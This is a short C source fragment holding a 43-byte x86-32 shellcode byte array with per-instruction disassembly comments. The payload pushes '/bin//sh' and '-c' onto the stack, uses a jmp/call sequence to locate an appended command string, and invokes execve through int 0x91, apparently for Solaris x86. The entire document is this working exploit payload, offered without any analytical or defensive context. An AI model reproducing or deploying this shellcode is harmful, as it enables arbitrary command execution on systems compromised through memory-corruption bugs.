
// Target architecture : X86 32

#define CMD_SIZE 43

char CMD[] = {
  /* 0000 */ "\x6a\x3b"             /* push 0x3b       */
  /* 0002 */ "\x58"                 /* pop  eax        */
  /* 0003 */ "\x99"                 /* cdq             */
  /* 0004 */ "\x52"                 /* push edx        */
  /* 0005 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f */
  /* 000A */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f */
  /* 000F */ "\x89\xe3"             /* mov  ebx, esp   */
  /* 0011 */ "\x52"                 /* push edx        */
  /* 0012 */ "\x66\x68\x2d\x63"     /* push 0x632d     */
  /* 0016 */ "\x89\xe7"             /* mov  edi, esp   */
  /* 0018 */ "\x52"                 /* push edx        */
  /* 0019 */ "\xeb\x0b"             /* jmp  0x26       */
  /* 001B */ "\x57"                 /* push edi        */
  /* 001C */ "\x53"                 /* push ebx        */
  /* 001D */ "\x89\xe1"             /* mov  ecx, esp   */
  /* 001F */ "\x52"                 /* push edx        */
  /* 0020 */ "\x52"                 /* push edx        */
  /* 0021 */ "\x51"                 /* push ecx        */
  /* 0022 */ "\x53"                 /* push ebx        */
  /* 0023 */ "\x52"                 /* push edx        */
  /* 0024 */ "\xcd\x91"             /* int  0x91       */
  /* 0026 */ "\xe8\xf0\xff\xff\xff" /* call 0x1b       */
};